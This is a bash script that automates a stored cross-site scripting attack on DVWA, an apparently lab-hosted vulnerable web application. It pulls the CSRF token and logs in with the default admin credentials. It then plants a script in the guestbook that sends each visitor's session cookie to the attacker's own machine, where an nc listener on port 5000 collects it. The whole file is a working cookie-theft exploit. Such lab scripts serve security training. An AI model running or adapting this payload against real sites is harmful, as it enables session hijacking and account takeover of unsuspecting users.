#!/bin/bash
display_usage() { 
	echo -e "\nUsage: $0 [host] [port]\n" 
	} 
# if less than two arguments supplied, display usage 
	if [  $# -le 1 ] 
	then 
		display_usage
		exit 1
	fi 
host=$1
port=$2
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.61 Safari/537.36"
ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
AE="gzip, deflate, br"
AL="en-GB,en-US;q=0.9,en;q=0.8"
REFERER="https://www.google.com/"
ip=`hostname -I|xargs`
rm dvwa.cookie
payload="<script>new Image().src=\"http://$ip:5000/?\"%2bdocument.cookie;</script>"
CSRF=$(curl -s -H "User-Agent: $UA" -H "ACCEPT: $ACCEPT" -H "ACCEPT-ENCODING: $AE" -H "ACCEPT-LANGUAGE: $AL" -c dvwa.cookie "$host:$port/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
curl -s -H "User-Agent: $UA" -H "ACCEPT: $ACCEPT" -H "ACCEPT-ENCODING: $AE" -H "ACCEPT-LANGUAGE: $AL" -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "$host:$port/login.php"
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
data="txtName=xss&mtxMessage=$payload&btnSign=Sign+Guestbook"
curl -s -H "Host: $host:$port" -H "User-Agent: $UA" -H "Accept: $ACCEPT" -H "Accept-Language: $AL" -H "Referer: http://$host:$port/vulnerabilities/xss_s/" -H "Cookie: PHPSESSID=$SESSIONID; security=low" -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -d "$data" "http://$host:$port/vulnerabilities/xss_s/">/dev/null
clear
echo
echo "Please visit the stored XSS page in DVWA..."
nc -nlp 5000
